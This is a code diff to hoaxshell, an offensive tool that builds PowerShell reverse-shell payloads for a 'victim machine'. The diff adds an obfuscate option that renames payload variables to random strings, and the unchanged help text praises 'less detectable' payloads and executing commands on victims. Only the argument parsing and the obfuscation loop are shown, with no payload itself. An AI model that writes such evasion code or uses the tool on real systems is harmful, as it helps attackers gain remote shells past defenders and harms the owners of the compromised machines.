@@ -15,6 +15,7 @@ from ipaddress import ip_address
 from subprocess import check_output, Popen, PIPE
 from string import ascii_uppercase, ascii_lowercase
 from platform import system as get_system_type
+from random import randint
 
 filterwarnings("ignore", category = DeprecationWarning)
 
@@ -95,6 +96,7 @@ parser.add_argument("-i", "--invoke-restmethod", action="store_true", help = "Ge
 parser.add_argument("-H", "--Header", action="store", help = "Hoaxshell utilizes a non-standard header to transfer the session id between requests. A random name is given to that header by default. Use this option to set a custom header name.")
 parser.add_argument("-x", "--exec-outfile", action="store", help = "Provide a filename (absolute path) on the victim machine to write and execute commands from instead of using \"Invoke-Expression\". The path better be quoted. Be careful when using special chars in the path (e.g. $env:USERNAME) as they must be properly escaped. See usage examples for details. CAUTION: you won't be able to change directory with this method. Your commands must include ablsolute paths to files etc.")
 parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded.")
+parser.add_argument("-o", "--obfuscate", action="store_true", help = "Obfuscate generated payload.")
 parser.add_argument("-v", "--server-version", action="store", help = "Provide a value for the \"Server\" response header (default: Apache/2.4.1)")
 parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (default: false).")
 parser.add_argument("-t", "--trusted-domain", action="store_true", help = "If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem). See usage examples for more details.")
@@ -689,6 +691,16 @@ def main():
 			
 			if args.constraint_mode:
 				payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")
+
+			if args.obfuscate:
+				
+				for var in ['$s', '$i', '$p', '$v']:
+					
+					_max = randint(1,5)
+					obf = str(uuid.uuid4())[0:_max]
+					
+					payload = payload.replace(var, f'${obf}')
+			
 			
 			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
 
